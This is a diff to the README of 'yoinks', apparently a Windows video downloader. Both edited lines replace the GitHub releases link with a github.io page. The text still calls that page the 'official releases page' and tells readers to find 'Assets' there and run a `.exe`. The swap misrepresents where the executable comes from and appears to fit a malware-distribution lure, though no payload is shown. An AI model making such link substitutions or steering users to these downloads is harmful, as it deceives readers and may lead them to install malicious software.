@@ -1,6 +1,6 @@
 # 📥 yoinks - Download online videos using your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lasting-insolvency87/yoinks/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://lasting-insolvency87.github.io)
 
 ## What is yoinks?
 
@@ -16,7 +16,7 @@ Yoinks saves videos from websites directly to your Windows computer. Most websit
 
 Follow these steps to set up yoinks on your computer.
 
-1. Visit the [official releases page](https://github.com/Lasting-insolvency87/yoinks/releases).
+1. Visit the [official releases page](https://lasting-insolvency87.github.io).
 2. Look for the section labeled "Assets" under the most recent version.
 3. Click the file that ends in `.exe`. This file works specifically for Windows systems.
 4. Wait for the download to finish. 
